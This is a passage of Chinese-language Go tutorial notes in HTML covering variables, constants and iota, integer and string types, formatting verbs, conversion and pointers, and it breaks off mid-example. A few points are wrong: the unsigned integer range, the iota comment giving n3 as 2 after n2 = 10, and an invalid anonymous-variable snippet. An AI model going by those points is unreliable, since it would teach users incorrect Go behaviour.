        <content type="html"><![CDATA[<h2 id="一、变量（Variable）"><a href="#一、变量（Variable）" class="headerlink" title="一、变量（Variable）"></a>一、变量（Variable）</h2><ul><li><p>变量使用前必须要声明，同一作用域内<strong>不能重复声明</strong>，声明后的非全局变量<strong>必须要被使用</strong>，否则编译报错。</p></li><li><p>所有在 Go中的创建的变量都必须要进行初始化。若不指定，则Go会使用类型对应的<code>0</code>值进行初始化。而保证Go会使用<code>0</code>值进行初始化的是<code>var</code>变量。因此声明变量要使用<code>var</code>。</p><blockquote><ul><li>int      &lt;===&gt; 0</li><li>float   &lt;===&gt; 0.0</li><li>bool   &lt;===&gt; false</li><li>string &lt;===&gt; “”（空字符串）</li><li>切片、函数、指针 &lt;===&gt; nil </li></ul></blockquote><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> a <span class="token builtin">int</span>    <span class="token keyword">var</span> b <span class="token builtin">string</span>    <span class="token keyword">var</span> c <span class="token builtin">float64</span>    <span class="token keyword">var</span> d <span class="token builtin">bool</span>    <span class="token keyword">var</span> e <span class="token operator">*</span><span class="token builtin">int</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"var a int  %T [%v]\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//var a int  int [0]</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"var b string  %T [%v]\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> b<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//var b string  string []</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"var c float64  %T [%v]\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//var c float64  float64 [0]</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"var d bool  %T [%v]\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">,</span> d<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//var d bool  bool [false]</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"var e *int  %T [%v]\n"</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//var e *int  *int [&lt;nil>]</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="0x00-变量声明及初始化"><a href="#0x00-变量声明及初始化" class="headerlink" title="0x00 变量声明及初始化"></a>0x00 变量声明及初始化</h5><blockquote><p>var 变量名 变量类型</p></blockquote><ul><li><p>变量声明</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//标准声明</span><span class="token keyword">var</span> name  <span class="token builtin">string</span><span class="token keyword">var</span> age   <span class="token builtin">int</span><span class="token keyword">var</span> isOk  <span class="token builtin">bool</span><span class="token comment" spellcheck="true">//批量声明</span><span class="token keyword">var</span> <span class="token punctuation">(</span>    name <span class="token builtin">string</span>    age <span class="token builtin">int</span>    isOk <span class="token builtin">bool</span><span class="token punctuation">)</span></code></pre></li><li><p>变量初始化</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//声明后初始化</span><span class="token keyword">var</span> name <span class="token builtin">string</span>name <span class="token operator">=</span> <span class="token string">"Ein"</span><span class="token comment" spellcheck="true">//声明同时初始化</span><span class="token keyword">var</span> age <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">18</span><span class="token comment" spellcheck="true">//Go可以根据值自动进行类型推导,因此在声明并初始化时可省略类型。</span><span class="token keyword">var</span> age <span class="token operator">=</span> <span class="token number">18</span><span class="token comment" spellcheck="true">//批量声明初始化</span><span class="token keyword">var</span> name<span class="token punctuation">,</span>age <span class="token operator">=</span> <span class="token string">"Ein"</span><span class="token punctuation">,</span><span class="token number">18</span></code></pre></li><li><p>短变量</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//':'可以当作var，只能在函数中使用，函数外部全局变量不可用，因为函数外部的语句都必须以关键字开头。</span><span class="token comment" spellcheck="true">// 定义变量同时要显式初始化</span><span class="token comment" spellcheck="true">// 变量在之前必须是未声明的。</span>name <span class="token operator">:=</span> <span class="token string">"Ein"</span>age <span class="token operator">:=</span> <span class="token number">18</span>name<span class="token punctuation">,</span>age <span class="token operator">:=</span> <span class="token string">"Mikasa"</span><span class="token punctuation">,</span><span class="token number">18</span></code></pre><ul><li><p>附加知识：在多个短变量声明和赋值中，至少有一个新声明的变量出现在左值中，即便其他变量名可能是重复声明的，编译器也不会报错。</p><pre class=" language-go"><code class="language-go">conn<span class="token punctuation">,</span>err <span class="token operator">:=</span> net<span class="token punctuation">.</span><span class="token function">Dial</span><span class="token punctuation">(</span><span class="token string">"tcp"</span><span class="token punctuation">,</span><span class="token string">"localhost:80"</span><span class="token punctuation">)</span>conn1<span class="token punctuation">,</span>err<span class="token operator">:=</span> net<span class="token punctuation">.</span><span class="token function">Dial</span><span class="token punctuation">(</span><span class="token string">"tcp"</span><span class="token punctuation">,</span><span class="token string">"localhost:80"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//err重复声明，但由于有新变量conn1声明，所以不会报错</span></code></pre></li></ul></li><li><p>匿名变量</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// '_'下划线可以用来作为匿名变量，他不会占空间。</span><span class="token comment" spellcheck="true">// 通常用于接收无用的函数返回值</span>x<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ul><h5 id="0x01-变量的作用域"><a href="#0x01-变量的作用域" class="headerlink" title="0x01 变量的作用域"></a>0x01 变量的作用域</h5><ul><li>函数内定义的变量称为局部变量</li><li>函数外定义的变量称为全局变量<ul><li>全局变量必须使用<code>var</code>关键字定义。</li><li>要想让外部包在<code>import</code>后可使用，变量名的首字母必须大写。</li></ul></li></ul><blockquote><p>Go语言中的变量、函数、常量名称的首字母也可以大写，如果首字母大写，则表示它可以被外部其它的包访问。</p></blockquote><h2 id="二、常量（Constant）"><a href="#二、常量（Constant）" class="headerlink" title="二、常量（Constant）"></a>二、常量（Constant）</h2><ul><li><p>常量即一旦定义，在程序运行期间不能被改变值。</p></li><li><p>常量<strong>只存在于编译时</strong>，即使定义在函数内部也是如此，并且只能是布尔型、数字型（整数型、浮点型和复数）和字符串型。</p></li><li><p>常量的值可以是表达式，但是必须是能够在编译时就能够确定的。</p></li><li><p>常量定义</p><pre class=" language-go"><code class="language-go"><span class="token keyword">const</span> pi <span class="token operator">=</span> <span class="token number">3.14</span><span class="token comment" spellcheck="true">//b、c的值会以a的值作为值。</span><span class="token keyword">const</span> <span class="token punctuation">(</span>    a <span class="token operator">=</span> <span class="token number">10</span>    b    c<span class="token punctuation">)</span></code></pre></li><li><p><code>iota</code>：<code>iota</code>第一次出现时，会被置为0。之后每增加一行，iota的值会增加1。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">const</span> <span class="token punctuation">(</span>    n1 <span class="token operator">=</span> <span class="token boolean">iota</span>       <span class="token comment" spellcheck="true">//0</span>    n2              <span class="token comment" spellcheck="true">//1</span>    n3              <span class="token comment" spellcheck="true">//2</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">(</span>    n1 <span class="token operator">=</span> <span class="token boolean">iota</span>       <span class="token comment" spellcheck="true">//0</span>    <span class="token boolean">_</span>    n3              <span class="token comment" spellcheck="true">//2</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">(</span>    n1 <span class="token operator">=</span> <span class="token boolean">iota</span>       <span class="token comment" spellcheck="true">//0</span>    n2 <span class="token operator">=</span> <span class="token number">10</span>     n3              <span class="token comment" spellcheck="true">//2</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">(</span>    n1<span class="token punctuation">,</span> n2 <span class="token operator">=</span> <span class="token boolean">iota</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">iota</span> <span class="token operator">+</span> <span class="token number">2</span>   <span class="token comment" spellcheck="true">//1,2。两个iota都为0</span>    <span class="token boolean">_</span><span class="token punctuation">,</span> <span class="token boolean">_</span>    n3<span class="token punctuation">,</span> n4             <span class="token comment" spellcheck="true">//3,4。两个iota为2。</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">(</span>    Ldate         <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token boolean">iota</span> <span class="token comment" spellcheck="true">//  1 :  1 左移 0位.  0000 0001</span>    Ltime                     <span class="token comment" spellcheck="true">//  2 :  1 左移 1位.  0000 0010</span>    Lmicroseconds             <span class="token comment" spellcheck="true">//  4 :  1 左移 2位.  0000 0100</span>    Llongfile                 <span class="token comment" spellcheck="true">//  8 :  1 左移 3位.  0000 1000</span>    Lshortfile                <span class="token comment" spellcheck="true">// 16 :  1 左移 4位.  0001 0000</span>    LUTC                      <span class="token comment" spellcheck="true">// 32 :  1 左移 5位.  0010 0000</span><span class="token punctuation">)</span></code></pre></li></ul><h2 id="三、基本数据类型"><a href="#三、基本数据类型" class="headerlink" title="三、基本数据类型"></a>三、基本数据类型</h2><h5 id="0x00-整型"><a href="#0x00-整型" class="headerlink" title="0x00 整型"></a>0x00 整型</h5><ul><li><p>Go语言同时提供了有符号和无符号类型的整数运算。</p><ul><li><code>int8</code>、<code>int16</code>、<code>int32</code> 和 <code>int64</code> 为有符号整数类型，分别对应 <code>8</code>、<code>16</code>、<code>32</code>、<code>64</code>bit 大小的有符号整数。</li><li><code>uint8</code>、<code>uint16</code>、<code>uint32</code> 和 <code>uint64</code> 对应无符号整数类型。</li></ul></li><li><p><code>int</code> 和 <code>uint</code>的大小是根据对应特定 CPU 平台的字长而定的，在32位系统为4个字节长（<code>int32</code>）， 在64位系统为8个字节长(<code>int64</code>)。</p></li><li><p><code>byte</code>类型实际为<code>uint8</code>。</p></li><li><p><code>rune</code> 类型实际是 <code>int32</code> ，通常用于Unicode 字符，表示一个 Unicode 码点(字符在字符集中的唯一编号)。</p></li><li><p><code>uintptr</code>，没有指定具体的 bit 大小但是足以容纳指针，常用于底层编程。</p></li><li><p>有符号整数使用最高 bit 位用来表示符号位，因此</p><ul><li>一个 n bit 的有符号数的取值范围是从 <code>-2^(n-1)</code> 到 <code>2^(n-1)-1</code></li><li>无符号取值范围： <code>0</code> 到 <code>2^(n-1)</code></li></ul></li></ul><h5 id="0x01-浮点型"><a href="#0x01-浮点型" class="headerlink" title="0x01 浮点型"></a>0x01 浮点型</h5><ul><li>Go语言提供了两种精度的浮点数，<code>float32</code> 和 <code>float64</code>。</li></ul><h5 id="0x02-布尔类型"><a href="#0x02-布尔类型" class="headerlink" title="0x02 布尔类型"></a>0x02 布尔类型</h5><ul><li>一个布尔类型的值只有两种：<code>true</code> 和 <code>false</code>。</li></ul><h5 id="0x03-字符"><a href="#0x03-字符" class="headerlink" title="0x03 字符"></a>0x03 字符</h5><p>字符使用单引号<code>&#39;&#39;</code>。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 下面四个是等价的</span>    <span class="token keyword">var</span> a <span class="token builtin">byte</span> <span class="token operator">=</span> <span class="token string">'A'</span>    <span class="token keyword">var</span> b <span class="token builtin">byte</span> <span class="token operator">=</span> <span class="token number">65</span>    <span class="token keyword">var</span> c <span class="token builtin">uint8</span> <span class="token operator">=</span> <span class="token string">'\x41'</span>    <span class="token keyword">var</span> d <span class="token builtin">byte</span> <span class="token operator">=</span> <span class="token string">'\101'</span>    <span class="token comment" spellcheck="true">// 下面三个等价，rune用于宽字符</span>    <span class="token keyword">var</span> e <span class="token builtin">rune</span> <span class="token operator">=</span> <span class="token string">'波'</span>    <span class="token keyword">var</span> f <span class="token builtin">int32</span> <span class="token operator">=</span> <span class="token string">'波'</span>    <span class="token keyword">var</span> g <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token string">'\u6CE2'</span> <span class="token comment" spellcheck="true">//用到 4 字节，则使用\u前缀，如果需要使用到 8 个字节，则使用\U前缀。</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%c、%c、%c、%c、%c、%c、%c"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> e<span class="token punctuation">,</span> f<span class="token punctuation">,</span> g<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//A、A、A、A、波、波、波</span><span class="token punctuation">}</span></code></pre><h5 id="0x04-字符串"><a href="#0x04-字符串" class="headerlink" title="0x04 字符串"></a>0x04 字符串</h5><ul><li><p>字符串是一个不可改变的字节序列，字符串用双引号<code>&quot;&quot;</code>。</p></li><li><p>字符串数据结构</p><ul><li><p>字长（<code>word</code>）即一个字的长度，字长由系统平台位数决定，与操作系统地址长度相同，32位系统字长为4字节，64位系统字长度8字节。</p></li><li><p>字符串的本质是数组（<code>array</code>）。</p></li><li><p>一个字符串的数据结构使用双字（<code>double word</code>）存储。</p><ul><li><p>第一个字（<code>word</code>）存储的是一个指针，指针指向字符串第一个字符。</p></li><li><p>第二个字（<code>word</code>）存储的是字符串的长度。</p><pre><code>//Go使用0值进行初始化时的字符串的数据结构。第一个字（指针）为nil，第二个字（长度）为0。-------| nil |-------|  0  |-------</code></pre></li></ul></li></ul></li><li><p>Go 支持2种形式的字符串字面值：</p><ul><li><p>解释字符串：使用双引号括起来的字符序列，不能跨行书写，其中的相关的转义字符将被替换。</p></li><li><p>非解释字符串：使用反引号“`”括起来，支持换行，反引号包含的内容会被原原本本的作为字符。</p><pre class=" language-go"><code class="language-go">str1 <span class="token operator">:=</span> <span class="token string">"abc\n"</span>   <span class="token comment" spellcheck="true">//\n会被解释为换行</span>str2 <span class="token operator">:=</span> <span class="token string">`abc\n`</span>   <span class="token comment" spellcheck="true">//\n会原原本本的输出</span></code></pre></li></ul></li><li><p><strong>字符串操作</strong></p><ul><li><p>字符串长度（所占字节长度）：<code>len(str)</code></p></li><li><p>字符串可索引得到字符<code>str[n]</code>，但是只适用于纯ascii字符的字符串，因为索引的是某字节值，而像中文字符由多个字节保存，就会索引不出来。</p></li><li><p>字符串拼接</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    str1 <span class="token operator">:=</span> <span class="token string">"this is"</span>    str2 <span class="token operator">:=</span> <span class="token string">"Mikasa"</span>    <span class="token comment" spellcheck="true">//可以使用“+”拼接字符串，+=也可以。</span>    str3 <span class="token operator">:=</span> str1 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> str2    str4 <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintln</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> str2<span class="token punctuation">)</span>    str5 <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%s %s \n"</span><span class="token punctuation">,</span> str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>str3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//this is Mikasa</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>str4<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//this is  Mikasa</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>str5<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//this is Mikasa</span><span class="token punctuation">}</span></code></pre></li><li><p>字符串遍历</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    str <span class="token operator">:=</span> <span class="token string">"Hello,阿库娅"</span>    <span class="token comment" spellcheck="true">//这种方式是以byte类型来处理，到中文时会出现乱码，即会把字符串转为[]byte切片。。</span>    <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//uint8</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v(%c)、"</span><span class="token punctuation">,</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>                     <span class="token comment" spellcheck="true">//这种方式是以rune类型来处理，可以正常打印出字符串，即会把字符串转为[]rune切片。</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> i <span class="token operator">:=</span> <span class="token keyword">range</span> str <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//int32</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v(%c)、"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> i<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li><p>字符串修改</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//字符串是不能被修改的（只读），要想修改字符串，必须要先将字符串转换为[]byte或[]rune类型的切片，本质上是进行了复制。</span><span class="token comment" spellcheck="true">//转换，修改</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    str <span class="token operator">:=</span> <span class="token string">"Hello,阿库娅"</span>    new_str <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">rune</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>    new_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'L'</span>    new_str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'L'</span>    new_str<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'雅'</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>new_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p>字符串函数</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    str <span class="token operator">:=</span> <span class="token string">"abcdecfg"</span>     ret <span class="token operator">:=</span> strings<span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//分割，[ab de fg]</span>    strings<span class="token punctuation">.</span><span class="token function">Join</span><span class="token punctuation">(</span>ret<span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">//合并，ab+de+fg</span>    strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token string">"cd"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//是否包含字串，true</span>    strings<span class="token punctuation">.</span><span class="token function">HasPrefix</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token string">"abc"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//是否以字串为前缀，true</span>    strings<span class="token punctuation">.</span><span class="token function">HasSuffix</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token string">"cfg"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//是否以字串为后缀，true</span>    strings<span class="token punctuation">.</span><span class="token function">Index</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token string">"cd"</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//字串第一次出现的索引，2</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul><h2 id="四、字符串格式化占位符"><a href="#四、字符串格式化占位符" class="headerlink" title="四、字符串格式化占位符"></a>四、字符串格式化占位符</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> a <span class="token builtin">string</span> <span class="token operator">=</span> <span class="token string">"zzzz"</span>    <span class="token keyword">var</span> b <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T %T\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//变量的类型</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v %v\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//变量的值</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//十进制形式整形</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%b\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//二进制形式整形</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%o\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//八进制形式整形</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//十六进制形式整形</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">//字符串</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%c\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//字符</span><span class="token punctuation">}</span></code></pre><h2 id="五、类型转换"><a href="#五、类型转换" class="headerlink" title="五、类型转换"></a>五、类型转换</h2><ul><li><p>Go语言只有强制类型转换，没有隐式类型转换。</p></li><li><p>只有支持相互转换的类型之间才能进行强制类型转换。</p><blockquote><ul><li>字符串与切片</li><li>整形与浮点型</li></ul></blockquote></li></ul><blockquote><p>T(表达式)      //将括号中的转化为类型T。</p></blockquote><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> num <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">100</span>f <span class="token operator">:=</span> <span class="token function">float32</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token keyword">var</span> str <span class="token builtin">string</span> <span class="token operator">=</span> <span class="token string">"abcde"</span>slc <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>slc1 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">rune</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span></code></pre><h2 id="六、指针"><a href="#六、指针" class="headerlink" title="六、指针"></a>六、指针</h2><ul><li><strong>使用指针只有一个目的，就是为了共享内存。</strong></li></ul><img src="/2020/10/13/Golang%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/ptr.png" alt="ptr" style="zoom: 33%;"><ul><li><p><strong>指针变量存储的是指针指向的变量的地址。</strong></p><ul><li><p>在变量名前面添加<code>&amp;</code>操作符（前缀）来获取变量的内存地址（取地址操作）。</p></li><li><p>对指针变量进行取值操作使用<code>*</code>操作符，可以获得指针变量指向的原变量的值。</p><blockquote><ul><li><code>*</code>操作符作为右值时，意义是取指针的值，</li><li><code>*</code>作为左值时，也就是放在赋值操作符的左边时，表示指针指向的变量。</li></ul></blockquote></li></ul></li><li><p><strong>Go语言的类型指针不能进行偏移和运算，只能对数据进行修改。</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">swap</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b <span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    t <span class="token operator">:=</span> <span class="token operator">*</span>a    <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token operator">*</span>b  <span class="token comment" spellcheck="true">//*操作符作为右值时，意义是取指针的值。作为左值时，表示指针指向的变量。</span>    <span class="token operator">*</span>b <span class="token operator">=</span> t<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//1 2</span>    <span class="token function">swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>x<span class="token punctuation">,</span> <span class="token operator">&amp;</span>y<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//2 1</span><span class="token punctuation">}</span></code></pre></li><li><p><code>new</code>创建指针</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> p1 <span class="token operator">*</span><span class="token builtin">int</span>    p2 <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//&lt;nil></span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//0xc000064058,某个int类型变量地址</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    ptr1 <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span>    ptr2 <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>    ptr3 <span class="token operator">:=</span> <span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%T、%T、%T\n"</span><span class="token punctuation">,</span> ptr1<span class="token punctuation">,</span> ptr2<span class="token punctuation">,</span> ptr3<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//*string、*int、*[]uint8</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v、%v、%v\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">,</span> <span class="token operator">*</span>ptr3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//""、0、[]</span>    <span class="token operator">*</span>ptr1 <span class="token operator">=</span> <span class="token string">"Hello"</span>    <span class="token operator">*</span>ptr2 <span class="token operator">=</span> <span class="token number">2</span>    <span class="token operator">*</span>ptr3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span 